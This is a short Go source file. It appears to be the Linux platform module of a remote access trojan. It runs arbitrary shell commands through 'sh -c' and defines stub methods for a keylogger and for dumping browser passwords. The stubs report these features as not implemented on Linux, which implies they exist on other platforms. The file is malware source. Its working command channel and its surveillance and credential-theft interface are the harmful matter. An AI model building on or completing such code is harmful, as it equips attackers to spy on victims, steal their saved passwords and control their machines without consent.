//go:build linux

package linux

import (
	"os/exec"
)

// LinuxPlatform represents the Linux platform.
type LinuxPlatform struct{}

// NewPlatform returns a new instance of the LinuxPlatform.
func NewPlatform() *LinuxPlatform {
	return &LinuxPlatform{}
}

// ExecuteCommand executes a command on Linux.
func (p *LinuxPlatform) ExecuteCommand(command string) ([]byte, error) {
	cmd := exec.Command("sh", "-c", command)
	return cmd.CombinedOutput()
}

// Init does nothing on Linux.
func (p *LinuxPlatform) Init() error {
	return nil
}

// StartKeylogger does nothing on Linux.
func (p *LinuxPlatform) StartKeylogger() {}

// GetKeylogs does nothing on Linux.
func (p *LinuxPlatform) GetKeylogs() string {
	return "Keylogger not implemented for Linux."
}

// DumpBrowsers does nothing on Linux.
func (p *LinuxPlatform) DumpBrowsers() string {
	return "Browser password dumping not implemented for Linux."
}
